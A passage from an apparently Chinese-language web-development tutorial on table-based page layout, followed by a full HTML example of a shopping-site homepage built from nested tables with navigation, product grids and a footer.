设置单元格垂直合并</p><p>传统布局：<br>传统的布局方式就是使用table来做整体页面的布局，布局的技巧归纳为如下几点：</p><ol><li><p>定义表格宽高，将border、cellpadding、cellspacing全部设置为0</p></li><li><p>单元格里面嵌套表格</p></li><li><p>单元格中的元素和嵌套的表格用align和valign设置对齐方式</p></li><li><p>通过属性或者css样式设置单元格中元素的样式</p></li><li>一定要注意闭合标签</li></ol><p><strong>一些整体的布局思路</strong>：<br>先整体大的分，再小的分。可以把边框调出来。<br>首先分析需要几行几列，接着分析哪个需要嵌套一个表格，一般最外围的table需要一个width=100%,然后如果一行里面还需要分几个格子，然后再嵌套一个表格，如果行内只有一个单元格，那就不需要嵌套。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>  <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/logo2.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/header.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>  <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>手机数码<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>鞋靴箱包<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>电脑办公<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>香烟香水<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"50px"</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"mui-input-clear"</span> <span class="attr">placeholder</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span> 搜索<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 如何在列表中设置他们的位置,比如说一行里面的位置是如何摆放的 </span></span><br><span class="line"><span class="comment">          如何</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/1.jpg"</span> <span class="attr">alt</span>=<span class="string">"图片加载错误...."</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">cellspacing</span>=<span class="string">10px</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>最新商品<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>根据你的喜好精心为你推荐!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"500px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">valign</span>=<span class="string">"top"</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/big01.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"3"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/middle01.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">&lt; &lt;img src="img/hao/small03.jpg" alt="" width="100%"&gt;&lt;br&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"20px"</span> <span class="attr">width</span>=<span class="string">100%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/ad.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">cellspacing</span>=<span class="string">10px</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>热门商品<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>根据你的喜好精心为你推荐!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"500px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">valign</span>=<span class="string">"top"</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/big01.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"3"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/middle01.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">&lt; &lt;img src="img/hao/small03.jpg" alt="" width="100%"&gt;&lt;br&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/small03.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"red"</span>&gt;</span>$289<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"20px"</span> <span class="attr">width</span>=<span class="string">100%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/hao/ad.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/footer.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">border</span>=<span class="string">"2px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> &gt;</span>copyright by @星晴<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 